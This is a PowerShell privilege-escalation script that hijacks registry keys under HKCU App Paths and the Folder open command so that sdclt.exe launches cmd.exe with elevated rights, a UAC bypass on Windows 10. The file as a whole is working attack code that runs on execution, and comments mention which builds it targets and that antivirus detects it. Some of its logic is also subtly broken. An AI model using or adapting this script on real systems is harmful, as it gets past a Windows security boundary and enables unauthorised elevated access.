<#
 # Privilege Escalation
 #>

function sdclt_appPath(){ # requires administrator privileges so unuseless (Windows 10:(10240) to Windows 10:(16215))
    Write-Host "WindowsOS version:$($winOSVersion.Major),Build:$($winOSVersion.Build)"
    Write-Host "SDCLT AppPath Hijack."
    if(!($winOSVersion.Build -ge 10240 -and $winOSVersion.Build -le 16215)){
        # Write-Error "This Build Version Not work ."
        Write-Host "This Build Version Not work ."
        return
    }

    # setKey
    # $sdcltPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\control.exe" #HKLM : need admin
    $sdcltPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" #HKCU
    
    $RegistryValueName = "(default)"
    $RegistryValueData = $env:ComSpec #cmd.exe

    if(Test-Path $sdcltPath){
        Write-Host "[ ]Value Already Exists"
        $defaultBackup = Get-ItemProperty -Path $sdcltPath -Name $RegistryValueName 

        Write-Host "[+]Value Set"
        Set-ItemProperty -Path $sdcltPath -Name $RegistryValueName -Value $RegistryValueData

        Write-Host "[-]Registry Restore"
        Set-ItemProperty -Path $sdcltPath -Name $RegistryValueName -Value $defaultBackup
    }
    else{
        Write-Host "[+]New Value Create"
        New-Item -Path $sdcltPath -Force > $null
        Write-Host "[+]Value Set"
        Set-ItemProperty -Path $sdcltPath -Name $RegistryValueName -Value $RegistryValueData
        Start-Process -FilePath sdclt.exe -Wait
        
        # restore 
        Write-Host "[-]Registry Restore"
        Remove-Item -Path $sdcltPath -Force
    }
}

function sdclt_classes(){ # Not Need Admin but detect by AV. (Windows10:(14393) --> )
    Write-Host "WindowsOS version:$($winOSVersion.Major),Build:$($winOSVersion.Build)"
    Write-Host "SDCLT Classes Hijack."
    $sdcltPath = "HKCU:\Software\Classes\Folder\shell\open\command"
    if(Test-Path $sdcltPath){
        Write-Host "[ ]Registry Already Exists."
        $defaultBakup = Get-ItemProperty -Path $sdcltPath -Name "(default)"
        $DelegateExecuteBackup = Get-ItemProperty -Path $sdcltPath "DelegateExecute"

        Write-Host "[+]Value Set"
        Set-ItemProperty -Path $sdcltPath -Name "(default)" -Value $env:ComSpec
        Set-ItemProperty -Path $sdcltPath -Name "DelegateExecute" -Value ""
        Start-Process -FilePath sdclt.exe -Wait
        
        # restore 
        Write-Host "[-]Registry Restore"
        Set-ItemProperty -Path $sdcltPath -Name "(default)" -Value $defaultBakup
        Set-ItemProperty -Path $sdcltPath -Name "DelegateExecute" -Value $DelegateExecuteBackup
    }
    else {
        Write-Host "[+]New Value Create"
        New-Item -Path $sdcltPath -Force > $null
        Write-Host "[+]Value Set"
        Set-ItemProperty -Path $sdcltPath -Name "(default)" -Value $env:ComSpec
        Set-ItemProperty -Path $sdcltPath -Name "DelegateExecute" -Value ""
        Start-Process -FilePath sdclt.exe -Wait
        
        # restore 
        Write-Host "[-]Registry Restore"
        Remove-Item -Path $sdcltPath -Force
    }
}



$winOSVersion = ([System.Environment]::OSVersion.Version)
switch ($winOSVersion.Major) {
    7 {}
    {8 -or 10} {sdclt_classes;sdclt_appPath;}
    Default {}
}